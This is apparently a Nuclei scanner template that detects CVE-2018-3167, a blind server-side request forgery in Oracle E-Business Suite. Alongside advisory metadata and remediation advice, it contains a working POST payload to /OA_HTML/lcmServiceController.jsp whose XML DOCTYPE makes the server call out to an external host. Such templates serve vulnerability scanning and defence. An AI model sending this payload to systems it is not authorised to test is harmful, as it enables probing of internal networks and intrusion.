id: CVE-2018-3167

info:
  name: Oracle E-Business Suite - Blind SSRF
  author: geeknik
  severity: medium
  description: Oracle E-Business Suite, Application Management Pack component (User Monitoring subcomponent), is susceptible to blind server-side request forgery. An attacker with network access via HTTP can gain read access to a subset of data, connect to internal services like HTTP-enabled databases, or perform post requests towards internal services which are not intended to be exposed. Affected supported versions are 12.1.3, 12.2.3, 12.2.4, 12.2.5, 12.2.6, and 12.2.7.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to bypass network restrictions and access internal resources.
  remediation: |
    Apply the necessary patches or updates provided by Oracle to mitigate this vulnerability.
  reference:
    - http://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html
    - http://web.archive.org/web/20211206102649/https://securitytracker.com/id/1041897
    - https://medium.com/@x41x41x41/unauthenticated-ssrf-in-oracle-ebs-765bd789a145
    - https://nvd.nist.gov/vuln/detail/CVE-2018-3167
    - http://www.securitytracker.com/id/1041897
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2018-3167
    epss-score: 0.68659
    epss-percentile: 0.98558
    cpe: cpe:2.3:a:oracle:application_management_pack:12.1.3:*:*:*:*:e-business_suite:*:*
  metadata:
    max-request: 1
    vendor: oracle
    product: application_management_pack
    framework: e-business_suite
  tags: cve,cve2018,oracle,ebs,ssrf,blind,e-business_suite

http:
  - method: POST
    path:
      - '{{BaseURL}}/OA_HTML/lcmServiceController.jsp'

    body: <!DOCTYPE root PUBLIC "-//B/A/EN" "http://interact.sh">

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Unexpected text in DTD'

      - type: status
        status:
          - 200
# digest: 490a0046304402201bd8632470d24bd192971e57194251fce54c1c5cc87325634a6d77870677e8ab02201e7b3fb3981c50939765746ca7699d7ab883ee320fd59a061d8b9f23c42bcd8b:922c64590222798bb761d5b6d8e72950